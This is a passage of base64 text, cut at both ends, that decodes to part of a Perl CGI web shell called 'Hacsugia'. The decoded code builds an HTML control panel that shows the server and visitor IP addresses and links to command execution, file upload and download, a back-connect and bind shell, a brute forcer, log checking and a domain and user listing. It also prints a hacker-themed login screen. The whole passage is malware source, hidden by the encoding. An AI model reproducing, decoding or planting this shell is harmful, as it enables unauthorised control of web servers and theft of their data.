FxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQ0KCQkkaW57J2ZpbGVkYXRhJ30gPSAkQm9keTsNCgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyANCgkJJGlueydmJ30gPSAkMTsgDQoJCSRpbnsnZid9ID1+IHMvXCIvL2c7DQoJCSRpbnsnZid9ID1+IHMvXHMvL2c7DQoNCgkJIyBwYXJzZSB0cmFpbGVyDQoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQoJCXsgDQoJCQkkbGlzdFskaV0gPX4gcy9eLituYW1lPSQvLzsNCgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsNCgkJCSRrZXkgPSAkMTsNCgkJCSR2YWwgPSAkJzsNCgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9ID0gJHZhbDsgDQoJCX0NCgl9DQoJZWxzZSAjIHN0YW5kYXJkIHBvc3QgZGF0YSAodXJsIGVuY29kZWQsIG5vdCBtdWx0aXBhcnQpDQoJew0KCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7DQoJCWZvcmVhY2ggJGkgKDAgLi4gJCNpbikNCgkJew0KCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsNCgkJCSgka2V5LCAkdmFsKSA9IHNwbGl0KC89LywgJGluWyRpXSwgMik7DQoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSAuPSAiXDAiIGlmIChkZWZpbmVkKCRpbnska2V5fSkpOw0KCQkJJGlueyRrZXl9IC49ICR2YWw7DQoJCX0NCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyDQojIEFyZ3VtZW50IDE6IEZvcm0gaXRlbSBuYW1lIHRvIHdoaWNoIGZvY3VzIHNob3VsZCBiZSBzZXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VIZWFkZXINCnsNCgkkRW5jb2RlZEN1cnJlbnREaXIgPSAkQ3VycmVudERpcjsNCgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KCW15ICRkaXIgPSRDdXJyZW50RGlyOw0KCSRkaXI9fiBzL1xcL1xcXFwvZzsNCglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCglwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+DQo8dGl0bGU+SGFjc3VnaWE8L3RpdGxlPg0KDQokSHRtbE1ldGFIZWFkZXINCg0KPC9oZWFkPg0KPHN0eWxlPg0KYm9keXsNCmZvbnQ6IDEwcHQgVmVyZGFuYTsNCn0NCnRyIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KY29sb3I6ICNmZjk5MDA7DQp9DQp0ZCB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCmNvbG9yOiAjMkJBOEVDOw0KZm9udDogMTBwdCBWZXJkYW5hOw0KfQ0KDQp0YWJsZSB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxMTE7DQp9DQoNCg0KaW5wdXQgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCmZvbnQ6IDEwcHQgVmVyZGFuYTsNCmNvbG9yOiAjZmY5OTAwOw0KfQ0KDQppbnB1dC5zdWJtaXQgew0KdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KY29sb3I6ICNGRkZGRkY7DQpib3JkZXItY29sb3I6ICMwMDk5MDA7DQp9DQoNCmNvZGUgew0KYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7DQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOw0KY29sb3I6IHdoaWxlOw0KfQ0KDQpydW4gew0KYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7DQpmb250OiAxMHB0IFZlcmRhbmEgYm9sZDsNCmNvbG9yOiAjRkYwMEFBOw0KfQ0KDQp0ZXh0YXJlYSB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7DQpmb250OiBGaXhlZHN5cyBib2xkOw0KY29sb3I6ICNhYWE7DQp9DQpBOmxpbmsgew0KCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTpob3ZlciB7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjZmY5OTAwOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6YWN0aXZlIHsNCgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCg0KLmxpc3RkaXIgdHI6aG92ZXJ7DQoJYmFja2dyb3VuZDogIzQ0NDsNCn0NCi5saXN0ZGlyIHRyOmhvdmVyIHRkew0KCWJhY2tncm91bmQ6ICM0NDQ7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmU7DQp9DQoubm90bGluZXsNCgliYWNrZ3JvdW5kOiAjMTExOw0KfQ0KLmxpbmV7DQoJYmFja2dyb3VuZDogIzIyMjsNCn0NCjwvc3R5bGU+DQo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4NCmZ1bmN0aW9uIGNobW9kX2Zvcm0oaSxmaWxlKQ0Kew0KCS8qdmFyIGFqYXg9J2FqYXhfUG9zdERhdGEoIkZvcm1QZXJtc18nK2krJyIsIiRTY3JpcHRMb2NhdGlvbiIsIlJlc3BvbnNlRGF0YSIpOyByZXR1cm4gZmFsc2U7JzsqLw0KCXZhciBhamF4PSIiOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlUGVybXNfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPWNobW9kIHR5cGU9dGV4dCBzaXplPTUgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGFqYXggKyAiJyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPSdndWknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWQgdmFsdWU9JyRkaXInPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWYgdmFsdWU9JyIrZmlsZSsiJz48L2Zvcm0+IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dF8iICsgaSkuZm9jdXMoKTsNCn0NCmZ1bmN0aW9uIHJtX2NobW9kX2Zvcm0ocmVzcG9uc2UsaSxwZXJtcyxmaWxlKQ0Kew0KCXJlc3BvbnNlLmlubmVySFRNTCA9ICI8c3BhbiBvbmNsaWNrPVxcXCJjaG1vZF9mb3JtKCIgKyBpICsgIiwnIisgZmlsZSsgIicpXFxcIiA+IisgcGVybXMgKyI8L3NwYW4+PC90ZD4iOw0KfQ0KZnVuY3Rpb24gcmVuYW1lX2Zvcm0oaSxmaWxlLGYpDQp7DQoJdmFyIGFqYXg9IiI7DQoJZi5yZXBsYWNlKC9cXFxcL2csIlxcXFxcXFxcIik7DQoJdmFyIGJhY2s9InJtX3JlbmFtZV9mb3JtKCIraSsiLFxcXCIiK2ZpbGUrIlxcXCIsXFxcIiIrZisiXFxcIik7IHJldHVybiBmYWxzZTsiOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1yZW5hbWUgdHlwZT10ZXh0IHZhbHVlPSAnIitmaWxlKyInIC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBhamF4ICsgIicgdmFsdWU9T0s+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBiYWNrICsgIicgdmFsdWU9Q2FuY2VsPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0ZXh0XyIgKyBpKS5mb2N1cygpOw0KfQ0KZnVuY3Rpb24gcm1fcmVuYW1lX2Zvcm0oaSxmaWxlLGYpDQp7DQoJaWYoZj09J2YnKQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0kZGlyJmM9ZWRpdCUyMCIrZmlsZSsiJTIwJz4iICtmaWxlKyAiPC9hPiI7DQoJfWVsc2UNCgl7DQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8YSBocmVmPSc/YT1ndWkmZD0iK2YrIic+WyAiICtmaWxlKyAiIF08L2E+IjsNCgl9DQp9DQo8L3NjcmlwdD4NCjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjMGMwYzBjIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiPg0KPGNlbnRlcj48Y29kZT4NCjx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjIiPg0KPHRyPg0KCTx0ZCBhbGlnbj0iY2VudGVyIiByb3dzcGFuPTI+DQoJCTxiPjxmb250IHNpemU9IjUiPiRFZGl0UGVyc2lvbjwvZm9udD48L2I+DQoJPC90ZD4NCg0KCTx0ZD4NCg0KCQk8Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4kRU5WeyJTRVJWRVJfU09GVFdBUkUifTwvZm9udD4NCgk8L3RkPg0KCTx0ZD5TZXJ2ZXIgSVA6PGZvbnQgY29sb3I9IiNiYjAwMDAiPiAkRU5WeydTRVJWRVJfQUREUid9PC9mb250PiB8IFlvdXIgSVA6IDxmb250IGNvbG9yPSIjYmIwMDAwIj4kRU5WeydSRU1PVEVfQUREUid9PC9mb250Pg0KCTwvdGQ+DQoNCjwvdHI+DQoNCjx0cj4NCjx0ZCBjb2xzcGFuPSIzIj48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4NCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbiI+SG9tZTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNvbW1hbmQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkNvbW1hbmQ8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWd1aSZkPSRFbmNvZGVkQ3VycmVudERpciI+R1VJPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5Eb3dubG9hZCBGaWxlPC9hPiB8DQoNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJhY2tiaW5kIj5CYWNrICYgQmluZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YnJ1dGVmb3JjZXIiPkJydXRlIEZvcmNlcjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y2hlY2tsb2ciPkNoZWNrIExvZzwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG9tYWluc3VzZXIiPkRvbWFpbnMvVXNlcnM8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+TG9nb3V0PC9hPiB8DQo8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0iIyI+SGVscDwvYT4NCg0KPC9mb250PjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjxmb250IGlkPSJSZXNwb25zZURhdGEiIGNvbG9yPSIjZmY5OWNjIiA+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5TY3JlZW4NCnsNCg0KCXByaW50IDw8RU5EOw0KPHByZT48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQpUeXBpbmdUZXh0ID0gZnVuY3Rpb24oZWxlbWVudCwgaW50ZXJ2YWwsIGN1cnNvciwgZmluaXNoZWRDYWxsYmFjaykgew0KICBpZigodHlwZW9mIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkID09ICJ1bmRlZmluZWQiKSB8fCAodHlwZW9mIGVsZW1lbnQuaW5uZXJIVE1MID09ICJ1bmRlZmluZWQiKSkgew0KICAgIHRoaXMucnVubmluZyA9IHRydWU7CS8vIE5ldmVyIHJ1bi4NCiAgICByZXR1cm47DQogIH0NCiAgdGhpcy5lbGVtZW50ID0gZWxlbWVudDsNCiAgdGhpcy5maW5pc2hlZENhbGxiYWNrID0gKGZpbmlzaGVkQ2FsbGJhY2sgPyBmaW5pc2hlZENhbGxiYWNrIDogZnVuY3Rpb24oKSB7IHJldHVybjsgfSk7DQogIHRoaXMuaW50ZXJ2YWwgPSAodHlwZW9mIGludGVydmFsID09ICJ1bmRlZmluZWQiID8gMTAwIDogaW50ZXJ2YWwpOw0KICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5lbGVtZW50LmlubmVySFRNTDsNCiAgdGhpcy51bnBhcnNlZE9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dDsNCiAgdGhpcy5jdXJzb3IgPSAoY3Vyc29yID8gY3Vyc29yIDogIiIpOw0KICB0aGlzLmN1cnJlbnRUZXh0ID0gIiI7DQogIHRoaXMuY3VycmVudENoYXIgPSAwOw0KICB0aGlzLmVsZW1lbnQudHlwaW5nVGV4dCA9IHRoaXM7DQogIGlmKHRoaXMuZWxlbWVudC5pZCA9PSAiIikgdGhpcy5lbGVtZW50LmlkID0gInR5cGluZ3RleHQiICsgVHlwaW5nVGV4dC5jdXJyZW50SW5kZXgrKzsNCiAgVHlwaW5nVGV4dC5hbGwucHVzaCh0aGlzKTsNCiAgdGhpcy5ydW5uaW5nID0gZmFsc2U7DQogIHRoaXMuaW5UYWcgPSBmYWxzZTsNCiAgdGhpcy50YWdCdWZmZXIgPSAiIjsNCiAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsNCiAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiI7DQp9DQpUeXBpbmdUZXh0LmFsbCA9IG5ldyBBcnJheSgpOw0KVHlwaW5nVGV4dC5jdXJyZW50SW5kZXggPSAwOw0KVHlwaW5nVGV4dC5ydW5BbGwgPSBmdW5jdGlvbigpIHsNCiAgZm9yKHZhciBpID0gMDsgaSA8IFR5cGluZ1RleHQuYWxsLmxlbmd0aDsgaSsrKSBUeXBpbmdUZXh0LmFsbFtpXS5ydW4oKTsNCn0NClR5cGluZ1RleHQucHJvdG90eXBlLnJ1biA9IGZ1bmN0aW9uKCkgew0KICBpZih0aGlzLnJ1bm5pbmcpIHJldHVybjsNCiAgaWYodHlwZW9mIHRoaXMub3JpZ1RleHQgPT0gInVuZGVmaW5lZCIpIHsNCiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7CS8vIFdlIGhhdmVuJ3QgZmluaXNoZWQgbG9hZGluZyB5ZXQuICBIYXZlIHBhdGllbmNlLg0KICAgIHJldHVybjsNCiAgfQ0KICBpZih0aGlzLmN1cnJlbnRUZXh0ID09ICIiKSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gIiI7DQovLyAgdGhpcy5vcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQucmVwbGFjZSgvPChbXjxdKSo+LywgIiIpOyAgICAgLy8gU3RyaXAgSFRNTCBmcm9tIHRleHQuDQogIGlmKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCkgew0KICAgIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI8IiAmJiAhdGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgPSAiPCI7DQogICAgICB0aGlzLmluVGFnID0gdHJ1ZTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI+IiAmJiB0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciArPSAiPiI7DQogICAgICB0aGlzLmluVGFnID0gZmFsc2U7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMudGFnQnVmZmVyOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiJiIgJiYgIXRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiJiI7DQogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IHRydWU7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiOyIgJiYgdGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSAiOyI7DQogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOw0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLkhUTUxFbnRpdHlCdWZmZXI7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2Ugew0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICB9DQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9IHRoaXMuY3VycmVudFRleHQ7DQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCArPSAodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoIC0gMSA/ICh0eXBlb2YgdGhpcy5jdXJzb3IgPT0gImZ1bmN0aW9uIiA/IHRoaXMuY3Vyc29yKHRoaXMuY3VycmVudFRleHQpIDogdGhpcy5jdXJzb3IpIDogIiIpOw0KICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7DQogIH0gZWxzZSB7DQoJdGhpcy5jdXJyZW50VGV4dCA9ICIiOw0KCXRoaXMuY3VycmVudENoYXIgPSAwOw0KICAgICAgICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsNCiAgICAgICAgdGhpcy5maW5pc2hlZENhbGxiYWNrKCk7DQogIH0NCn0NCjwvc2NyaXB0Pg0KPC9wcmU+DQoNCjxmb250IHN0eWxlPSJmb250OiAxNXB0IFZlcmRhbmE7IGNvbG9yOiB5ZWxsb3c7Ij5Db3B5cmlnaHQgKEMpIDIwMDEgUm9oaXRhYiBCYXRyYSA8L2ZvbnQ+PGJyPjxicj4NCjx0YWJsZSBhbGlnbj0iY2VudGVyIiBib3JkZXI9IjEiIHdpZHRoPSI2MDAiIGhlaWdoPg0KPHRib2R5Pjx0cj4NCjx0ZCB2YWxpZ249InRvcCIgYmFja2dyb3VuZD0iaHR0cDovL2RsLmRyb3Bib3guY29tL3UvMTA4NjAwNTEvaW1hZ2VzL21hdHJhbi5naWYiPjxwIGlkPSJoYWNrIiBzdHlsZT0ibWFyZ2luLWxlZnQ6IDNweDsiPg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPiBQbGVhc2UgV2FpdCAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250PiA8YnI+DQoNCjxmb250IGNvbG9yPSIjMDA5OTAwIj4gVHJ5aW5nIGNvbm5lY3QgdG8gU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPg0KPGZvbnQgY29sb3I9IiNGMDAwMDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj5+XCQ8L2ZvbnQ+IENvbm5lY3RlZCAhIDwvZm9udD48YnI+DQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gQ2hlY2tpbmcgU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4NCg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+IFRyeWluZyBjb25uZWN0IHRvIENvbW1hbmQgLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250Pjxicj4NCg0KPGZvbnQgY29sb3I9IiNGMDAwMDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+XCQgQ29ubmVjdGVkIENvbW1hbmQhIDwvZm9udD48YnI+DQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjxmb250IGNvbG9yPSIjRjAwMDAwIj5cJDwvZm9udD48L2ZvbnQ+IE9LISBZb3UgY2FuIGtpbGwgaXQhPC9mb250Pg0KPC90cj4NCjwvdGJvZHk+PC90YWJsZT4NCjxicj4NCg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KbmV3IFR5cGluZ1RleHQoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhhY2siKSwgMzAsIGZ1bmN0aW9uKGkpeyB2YXIgYXIgPSBuZXcgQXJyYXkoIl8iLCIiKTsgcmV0dXJuICIgIiArIGFyW2kubGVuZ3RoICUgYXIubGVuZ3RoXTsgfSk7DQpUeXBpbmdUZXh0LnJ1bkFsbCgpOw0KDQo8L3NjcmlwdD4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEFkZCBodG1sIHNwZWNpYWwgY2hhcnMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBIdG1sU3BlY2lhbENoYXJzKCQpew0KCW15ICR0ZXh0ID0gc2hpZnQ7DQoJJHRleHQgPX4gcy8mLyZhbXA7L2c7DQoJJHRleHQgPX4gcy8iLyZxdW90Oy9nOw0KCSR0ZXh0ID1+IHMvJy8mIzAzOTsvZzsNCgkkdGV4dCA9fiBzLzwvJmx0Oy9nOw0KCSR0ZXh0ID1+IHMvPi8mZ3Q7L2c7DQoJcmV0dXJuICR0ZXh0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBBZGQgbGluayBmb3IgZGly